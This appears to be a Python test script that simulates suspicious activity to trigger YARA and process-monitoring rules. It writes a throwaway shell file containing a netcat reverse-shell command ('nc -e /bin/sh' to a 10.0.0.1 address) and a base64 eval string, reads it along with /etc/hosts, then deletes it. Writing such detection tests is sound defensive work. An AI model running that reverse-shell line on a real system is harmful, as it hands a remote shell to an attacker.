import os
import sys
import time


def main():
    print("[*] Starting V9 validation trigger simulation...")
    sys.stdout.flush()

    # 1. Create a dummy file with suspicious strings
    suspicious_file = "dummy_payload.sh"
    with open(suspicious_file, "w") as f:
        f.write("#!/bin/bash\n")
        f.write("nc -e /bin/sh 10.0.0.1 4444\n")
        f.write("eval(base64 -d)\n")

    print(f"[*] Created suspicious file {suspicious_file}")
    sys.stdout.flush()

    # 2. Trigger python reading this file so YARA scans it
    # We will trigger the "python_hosts_read" rule just to get the process flagged,
    # but also have it open the dummy payload so YARA will scan both.

    print("[*] Simulating Event: Python opening /etc/hosts AND dummy_payload.sh")
    sys.stdout.flush()
    try:
        f1 = open("/etc/hosts")
        f2 = open(suspicious_file)
        f1.read()
        f2.read()
        time.sleep(2)
        f1.close()
        f2.close()
    except Exception as e:
        print(f"[!] Failed to read files: {e}")

    # Cleanup
    if os.path.exists(suspicious_file):
        os.remove(suspicious_file)

    print("[*] Simulation complete.")
    sys.stdout.flush()


if __name__ == "__main__":
    main()
